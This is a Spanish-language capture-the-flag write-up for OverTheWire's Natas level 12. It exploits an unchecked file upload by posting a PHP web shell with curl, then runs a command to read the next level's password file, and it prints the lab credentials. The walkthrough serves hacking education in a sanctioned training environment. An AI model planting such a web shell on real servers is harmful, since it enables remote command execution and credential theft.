# Natas 12

#### URL: http://natas12.natas.labs.overthewire.org/
#### Credenciales: natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

Podemos subir archivos de un tamaño especifico pero en el codigo no verifican el tipo, podemos subir un archivo php, cambiarle la extension y ejecutarlo en la ruta donde se sube.

Para eso hare uso de un codigo para RCE en https://www.revshells.com/:

``` html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Subimos el archivo:

```
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/ -F "uploadedfile=@/home/kalcast/Laboratorio/shell.php" -F "filename=shell.php" -F "MAX_FILE_SIZE=1000"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/b5vgdqr3rj.php">upload/b5vgdqr3rj.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Vamos a la ruta y con el argumento cmd ejecutamos `cat /etc/natas_webpass/natas13`

![2025-03-20-132644_1137x155_scrot](https://github.com/user-attachments/assets/995c78b5-2e54-4619-8af0-45622db832e7)

`natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

